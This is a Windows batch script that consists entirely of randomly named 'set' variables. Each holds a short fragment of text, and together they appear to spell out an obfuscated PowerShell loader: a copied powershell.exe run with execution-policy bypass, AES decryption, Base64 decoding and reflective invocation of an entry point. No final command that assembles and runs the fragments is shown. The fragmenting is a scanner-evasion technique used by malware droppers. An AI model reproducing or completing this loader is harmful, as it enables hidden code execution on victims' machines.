@echo off
set "WWOxZSPxHr=32"
set "dDzQOvranp=we"
set "KIWpiGUdGC= /"
set "MEiNDAjPlm=:\"
set "VPsSuavGmH=we"
set "XIKyXxdRRG=py"
set "yIPKQvXdBP=ws"
set "taLFUMCuHF=\W"
set "dXQmPZmQep=\v"
set "QTSXHtmEBm=0\"
set "IHcDbUiYWu=ll"
set "uMfHEqanev=co"
set "WIlvrtTqmF=1."
set "BALmXofxck=st"
set "zuXIKbBaCG=ll"
set "fvFJCoYIeY=nd"
set "vJJwCROaQA=em"
set "pyXqJtzWUw=ow"
set "sKKiDiFxhq=he"
set "NdNLDVFDTP=Wi"
set "bRMqEkfTFv=rs"
set "outlDbWflJ=Po"
set "aohCgofoTP=rS"
set "XGsTknubUB=.e"
set "ZxIAIrZzlp=Sy"
set "IeqYyfquIV=y "
set "fgNxCFbCpO= C"
set "fgsyLuTytD=po"
set "MIoSjPpNJW=he"
set "CYILsFMnmf=do"
set "paTXRnAAJE=xe"
set "WUZJlqOmYR=in"
set "nnGETcscTH=s\"
set "jDNAzVtcyx=cd"
set "fkplwrSqpJ= %~dp0"
set "gpWPawsVvK=YVYg"
set "RzvUsGPyLE=pres"
set "HfbigbwMVk=pher"
set "NWRmkYdvlc=ress"
set "uOLhNcqBfl= [Sy"
set "UqTQWfxpQA=ionM"
set "xjWNsHvuJa=$NqS"
set "mFlXXjeweL=TllA"
set "jUAKQcccgd=DpbQ"
set "UShGEblqUZ=($ah"
set "WPsroERGlM=('l0"
set "oKLLiomteW=MAGv"
set "ylrlOVdSPX=Yg.I"
set "sQbjpttzuf==');"
set "SgVdqRtPGo=]::N"
set "AytsDdpQgR=1] -"
set "RpYNrQAQWP=($ah"
set "cWhBKlGKuk=yste"
set "ZSHmzmolZj=yste"
set "XLwrPekptr=)) {"
set "jIBdUgdXgu=New-"
set "pcDOPBlurP= = N"
set "YDQHIbRLdl=:('g"
set "diVGoRUvXL=yvY."
set "gGFOdiDhJG=g.Pa"
set "CYEhYJNzdd=j.Su"
set "DCQTuOiRyw=[Sys"
set "hWoZACeXWt== $w"
set "xSHTsomfVI='gni"
set "APElUretdh=ct S"
set "jbdIUdKOgP=ay()"
set "MsjUrotmyk=esMa"
set "jhsZHFLEzJ=rity"
set "slrwTsQwrf=n ''"
set "TBeTKlKOdZ=;$im"
set "SkPpYASfhB=PD);"
set "aMqcMdnMHL=[]] "
set "mUGnMtyGNi=[Sys"
set "XIldayOkQQ=le  "
set "TjDsmrYMjP=16] "
set "RggvZOXbzb=m.Re"
set "cTbhwgEjLf=F'[-"
set "FPojtSdmqQ=rity"
set "OnXWnMXcCE=tQbv"
set "AKLXWyfLmc=MAGv"
set "UiOorsSWuf=NqSh"
set "ACRuKXHybT=ddin"
set "HTiEOxctfZ=xpH."
set "gCbVTTuixL=UGTu"
set "ZvsGXkwhia=-ep "
set "PseRyKGLMr===')"
set "mHKVTQgAff=pDZz"
set "CfIrwiYNBz=[-1."
set "RgiWsBhcUf=)($M"
set "IglefIkVaT=onve"
set "pXDbyByjHq=y]::"
set "SSncgEGtWp=rt]:"
set "hkjLnlBslE=e = "
set "GcNQdRbiGR=YVYg"
set "bDUXukwypx=y.Ci"
set "mGoAPGVJyc=ispo"
set "YOgXwSoCwu=ach "
set "BbMaTaFZhY=.Cry"
set "XgjVpQeAUC=Star"
set "rGtpWDIqjm=se()"
set "RKYwCkLARu=yTo("
set "ohOvfjknHI= = $"
set "vxfGMuYQpB=] -j"
set "ANHUpZWXRV=[Env"
set "UJzMwKssWv=)))"
set "bjkbDFwVau=bjec"
set "gYWPcZmthZ=wYVY"
set "shvZZfZcEb='dqR"
set "fhxXKRLjPm=oint"
set "AjdVBczpkM=daeR"
set "ruQmlNVJpQ=qShB"
set "kNOUVqKLsQ=('da"
